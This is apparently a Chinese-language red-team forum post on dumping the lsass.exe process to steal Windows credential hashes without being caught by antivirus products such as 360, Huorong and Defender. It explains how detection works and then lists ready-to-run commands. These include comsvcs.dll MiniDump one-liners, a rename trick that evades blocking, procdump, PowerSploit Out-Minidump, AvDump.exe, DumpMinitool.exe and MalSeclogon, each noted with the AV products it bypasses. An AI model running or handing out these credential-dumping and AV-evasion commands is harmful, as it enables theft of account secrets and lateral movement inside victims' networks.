0x00 前言
=======

**凭证转储**是攻击者用来破坏基础设施的最常用技术之一。它允许窃取敏感的凭证信息，并使攻击者能够在目标环境中进一步**横向移动**

负责此操作的进程是**lsass.exe**（本地安全机构子系统服务），我们需要**转储lsass 进程的内存**

**都是一些师傅们提到的，我是一个脚本小子**，小结一下，希望可以帮到各位师傅！

0x01 各大杀软的特点
============

![image-20220326102051700](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-21bdcb7ae5cb8be3f8e9b89c55da087feeb44572.png)

0x02 Windows Hasah组成
====================

Windows系统下的hash密码格式为：用户名称:RID:LM-HASH值:NT-HASH值，例如：

```php
Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::

解析:
用户名称为:Administrator
RID为:500
LM-HASH值为:C8825DB10F2590EAAAD3B435B51404EE
NTLM-HASH值为:683020925C5D8569C23AA724774CE6CC
```

0x03 整体流程
=========

1、通过使用访问`PROCESS_QUERY_INFORMATION`和`PROCESS_VM_READ`的`OpenProcess/NtOpenProcess`调用打开**lsass PID**的进程句柄

OpenProcess：<https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess>)

2、使用`MiniDumpWriteDump`读取 lsass 的所有进程地址空间，并将其保存到磁盘上的文件中

注：`MiniDumpWriteDump`严重依赖于`NtReadVirtualMemory`系统调用的使用，该系统调用允许它读取**远程**进程的内存

参考：

<https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess>

<https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess>

<https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump>

<http://undocumented.ntinternals.net/index.html?page=UserMode/Undocumented%20Functions/Memory%20Management/Virtual%20Memory/NtReadVirtualMemory.html>

0x04 两个常用会被检测的点
===============

- 第一个检测点：

通常发生在`OpenProcess`/ `NtOpenProcess`的使用上。Windows 内核允许我们的驱动程序为线程、进程和桌面**句柄**操作注册**回调例程列表。**这可以通过`ObRegisterCallbacks`来实现

注册新回调需要两个结构：`OB_CALLBACK_REGISTRATION`和`OB_OPERATION_REGISTRATION`

参考：

<https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks>

[https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-\_ob\_callback\_registration](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_ob_callback_registration)

[https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-\_ob\_operation\_registration](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_ob_operation_registration)

注：`OB_OPERATION_REGISTRATION`结构允许指定参数组合以直接从内核 **监视**任何新**创建/重复**的进程**句柄。**

- 第二个检测点：

通常发生在`NtReadVirtualMemory`的使用上，`ReadProcessMemory`也在内部使用

参考：

<http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtReadVirtualMemory.html>

<https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory>

最常用的方法是**Inline Hooking**来拦截针对 lsass 进程的`NtReadVirtualMemory`调用。

注：这种方法的问题在于监控发生在进程本身的同一环级别，因此[直接系统调用](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)或`unhooking`等技术很容易**绕过**这种检测。

参考：

系统调用：<https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/>

unhooking：<https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496>

更好的方法是使用`ETW`直接从内核接收有关特定函数调用的通知。例如，每当调用`NtReadVirtualMemory`时，内核函数`EtwTiLogReadWriteVm`将用于跟踪使用情况并将事件发送回来。现在大部分 EDR 都采用这种方式。

0x05 Bypass思路小结
===============

方法一：规避 WinDefender ATP 凭证盗窃

简要概述：创建进程的快照，以便使用快照句柄执行间接内存读取。然后在 MiniDumpWriteDump 调用中使用快照句柄，而不是直接使用目标进程句柄。

参考：<https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/>

方法二：使用句柄复制 AV

简要概述：重用已打开的 lsass 进程句柄，从而避免直接在 lsass 上调用 OpenProcess。

参考：<https://skelsec.medium.com/duping-av-with-handles-537ef985eb03>

方法三：使用 MirrorDump 将 LSASS 转储到内存中未检测到

简要概述：加载一个任意 LSA 插件，该插件执行从 lsass 进程到转储进程的 lsass进程句柄的复制。所以转储进程有一个随时可用的进程句柄来 lsass 而不调用 OpenProcess。

参考：<https://www.pentestpartners.com/security-blog/dumping-lsass-in-memory-undetected-using-mirrordump/>

0x06 注意
=======

mimikatz 执行

```php
sekurlsa::minidump
```

lsass 的dmp文件用不用是标准格式的dmp文件

其实只要拿回来的内存区域是正确的 就可以

0x07 命令执行
=========

注：要去使用powershell，默认的cmd没有sedebug权限

```php
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump (Get-Process lsass).Id Test.dmp full;Wait-Process -Id (Get-Process rundll32).id
```

```php
for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B lsass.dmp full
```

```php
powershell "rundll32 C:\windows\System32\comsvcs.dll, MiniDump 520 lsass.dmp full"
```

0x08 工具分享
=========

微软商店ProcDump
------------

已失效

我们首先尝试使用微软商店工具 `ProcDump` 绕过杀软，它拥有微软签名

因为是微软自己的工具，所以看看他是不是能获取系统和杀软的信任

项目地址：<https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump>

```php
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

![image-20220420195045664](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f5a0c8a83765702b5496b83d169fd32247984fce.png)

SQLDumper.exe
-------------

已失效，和ProcDump一样，拥有微软签名

![image-20220420195104787](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-37b24924f5c569dc39e50cb8d95929ff3bc6725a.png)

comsvcs.dll
-----------

comsvcs.dll，它是系统自带的

会被360、defender拦截，Bypass 火绒

在原理上都是使用API `MiniDumpWriteDump`，通过comsvcs.dll的导出函数MiniDump实现dump内存。

```php
BOOL MiniDumpWriteDump(
  [in] HANDLE                            hProcess,
  [in] DWORD                             ProcessId,
  [in] HANDLE                            hFile,
  [in] MINIDUMP_TYPE                     DumpType,
  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);
```

注：

我们要考虑权限问题，在dump指定进程内存文件时，需要开启`SeDebugPrivilege`权限。

管理员权限的cmd下，默认支持`SeDebugPrivilege`权限，但是状态为Disabled禁用状态。

![image-20220326111606393](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-36849d6aaf9d16ddaca7988180dda3fb145bb8be.png)

管理员权限的powershell下，默认支持`SeDebugPrivilege`权限，并且状态为Enabled

![image-20220326111801957](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5501291873698250de46b110802db5e20ae737da.png)

可以通过powershell执行`rundll32`的命令实现

```php
PS C:\WINDOWS\system32> tasklist | findstr lsass.exe
lsass.exe                     1084 Services                   0     27,564 K
```

命令格式：

```php
rundll32.exe comsvcs.dll MiniDump <lsass PID> <out path> full
```

直接利用发现会被拦截：

```php
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 1084 lsass.dmp full
```

简单的绕过思路：

copy一下`comsvcs.dll`并命名为随意名字，例如`matrix.dll`

```php
copy C:\windows\System32\comsvcs.dll matrix.dll
rundll32.exe matrix.dll, MiniDump 1084 lsass.dmp full
```

![image-20220326113128285](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f861dedb9a4b4e4729f2072d9cf4ab14b95733ee.png)

createdump.exe
--------------

已失效

`createdump.exe`它是随着.NET5出现的，拥有微软签名

![image-20220420195128063](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-23a776a6143e3c46bba571798ec65bb6f9e9a930.png)

PowerSploit 中的`Out-MiniDump.ps1`脚本
----------------------------------

我们可以选择创建进程的完整内存转储。

会被defender拦截，Bypass 火绒、360

导入

```php
Import-Module .\Out-Minidump.ps1
```

执行

```php
Get-Process lsass | Out-Minidump
```

![image-20220326113441961](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-97356aa11d5922b2576ef1dbd02c706551dde7fd.png)

hashdump脚本
----------

注：cmd或者双击 `hashdumpX64.exe` 只会生成一个0kb的lsass.dmp，需要通过Powershell执行

mimidogz(ps版mimikatz)
---------------------

已失效

项目地址：<https://github.com/fir3d0g/mimidogz>

下载后在目录中执行：

```php
Import-Module .\Invoke-Mimidogz.ps1
invoke-mimidogz
```

<https://t.co/pNGsLlx6Al>

```php
./DumpMinitool.exe 1 'dump6.txt' 2 660 3 Full
Dump minitool: Started with arguments 1 dump6.txt 2 660 3 Full
Output file: 'dump6.txt'
Process id: 660
Dump type: Full
Dumped process.
```

AvDump.exe
----------

Bypass火绒

`AvDump.exe`是`Avast`杀毒软件中自带的一个程序，可用于dump lsass

默认路径

```php
C:\Program Files\Avast Software\Avast
```

![image-20220420115020164](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-01714d14f014da74870c2e7790115d8180183296.png)

它带有Avast杀软数字签名

![image-20220420195009289](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f182d0488bb3da8f4ffd011d4625af32340c6ed7.png)

```php
AvDump.exe --pid 1060 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
```

![image-20220420115459240](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-061802f98d157cad6cd9c53212b0a13eefad5e6c.png)

DumpMinitool.exe
----------------

Bypass，360、火绒、defender

这个是在推特上大哥分享的LOLBIN

路径

```php
C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions
```

![image-20220420194913179](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6117afb354ac608aabada64fb098e7e8247f1030.png)

```php
DumpMinitool.x86.exe --file 1.txt --processId 1060 --dumpType Full
```

0x09 项目推荐
=========

<https://github.com/snovvcrash/MirrorDump>

<https://github.com/snovvcrash/MiniDump>

<https://github.com/deepinstinct/LsassSilentProcessExit>

国外：<https://github.com/b4rtik/ATPMiniDump>

[https://github.com/post-cyberlabs/Offensive\_tools/tree/main/PostDump](https://github.com/post-cyberlabs/Offensive_tools/tree/main/PostDump)

Bypass360和火绒、defender不行

<https://github.com/Redamancy404/MalSeclogon>

使用命令：`Malseclogon.exe -p [PID] -d 1 -o C:\Users\1255\Desktop\test\1.dmp`

需要管理员权限，Bypass，360、火绒、defender